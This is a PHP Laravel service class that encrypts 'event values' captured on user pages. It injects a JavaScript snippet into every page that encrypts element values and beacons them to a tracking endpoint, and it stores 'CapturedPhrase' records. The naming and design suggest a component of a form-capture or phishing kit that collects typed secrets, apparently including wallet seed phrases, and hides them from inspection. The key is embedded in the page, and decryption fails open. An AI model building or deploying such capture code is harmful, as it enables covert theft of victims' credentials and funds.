<?php

namespace App\Services;

/**
 * AES-256-GCM encrypt/decrypt for event values in transit and DB storage.
 *
 * Transport flow:
 *   1. PHP generates a random 32-byte enc_key per session, stores in user_sessions.enc_key
 *   2. enc_key hex is embedded in the user page JS
 *   3. JS encrypts sensitive values before POSTing (Web Crypto AES-256-GCM)
 *   4. PHP decrypts with the stored key before writing to DB
 *
 * DB flow (phrases only):
 *   Uses Laravel's Crypt::encryptString (AES-256-CBC, APP_KEY) on CapturedPhrase model.
 */
class PayloadCrypto
{
    /** Generate a new random 32-byte key, return as 64-char hex. */
    public static function generateKey(): string
    {
        return bin2hex(random_bytes(32));
    }

    /**
     * Decrypt a value that was encrypted by the JS Web Crypto AES-256-GCM client.
     * Format: "ENC:" + base64(iv[12] || ciphertext+tag)
     * Web Crypto AES-GCM appends the 16-byte tag to the end of ciphertext.
     */
    public static function decrypt(string $value, string $keyHex): string
    {
        if (!str_starts_with($value, 'ENC:')) {
            return $value; // not encrypted — pass through
        }

        try {
            $raw = base64_decode(substr($value, 4), strict: true);
            if ($raw === false || strlen($raw) < 28) return $value;

            $key       = hex2bin($keyHex);
            $iv        = substr($raw, 0, 12);
            // Web Crypto appends tag at the end: ciphertext = rawData[12..-16], tag = rawData[-16..]
            $ctWithTag = substr($raw, 12);
            $tag       = substr($ctWithTag, -16);
            $ct        = substr($ctWithTag, 0, -16);

            $plain = openssl_decrypt($ct, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $iv, $tag);
            return $plain !== false ? $plain : $value;
        } catch (\Throwable $e) {
            return $value; // fail open — return as-is
        }
    }

    /**
     * PHP-side encrypt (used for server-initiated encryption, e.g. tests).
     * Produces the same ENC: format the JS client expects.
     */
    public static function encrypt(string $plaintext, string $keyHex): string
    {
        $key  = hex2bin($keyHex);
        $iv   = random_bytes(12);
        $tag  = '';
        $ct   = openssl_encrypt($plaintext, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $iv, $tag);
        // PHP tag is separate; JS expects it appended after ciphertext
        return 'ENC:' . base64_encode($iv . $ct . $tag);
    }

    /**
     * JS encryption code to inject into every user page.
     * Call window._encVal(val) to get an encrypted value (returns a Promise<string>).
     */
    public static function jsLib(string $keyHex): string
    {
        return <<<JS
<script>
(function(){
  var _EK='{$keyHex}',_KO=null;
  async function _ik(){
    if(_KO)return _KO;
    if(!_EK||!window.crypto||!window.crypto.subtle){_KO=null;return null;}
    try{
      var kb=new Uint8Array(_EK.match(/../g).map(function(h){return parseInt(h,16);}));
      _KO=await window.crypto.subtle.importKey('raw',kb,{name:'AES-GCM'},false,['encrypt']);
    }catch(e){_KO=null;}
    return _KO;
  }
  window._encVal=async function(val){
    if(!val)return val;
    try{
      var k=await _ik();
      if(!k)return val;
      var iv=window.crypto.getRandomValues(new Uint8Array(12));
      var ct=await window.crypto.subtle.encrypt({name:'AES-GCM',iv:iv},k,new TextEncoder().encode(String(val)));
      var out=new Uint8Array(12+ct.byteLength);
      out.set(iv,0);out.set(new Uint8Array(ct),12);
      return 'ENC:'+btoa(String.fromCharCode.apply(null,out));
    }catch(e){return val;}
  };
  /* Encrypted fetch helper — wraps URLSearchParams value encryption */
  window._encBeacon=async function(track,csrf,page,type,element,value){
    var ev=await window._encVal(value);
    var b=new URLSearchParams({_token:csrf,page:page,type:type,element:element,value:ev});
    navigator.sendBeacon?navigator.sendBeacon(track,b):fetch(track,{method:'POST',body:b,keepalive:true});
  };
})();
</script>
JS;
    }
}
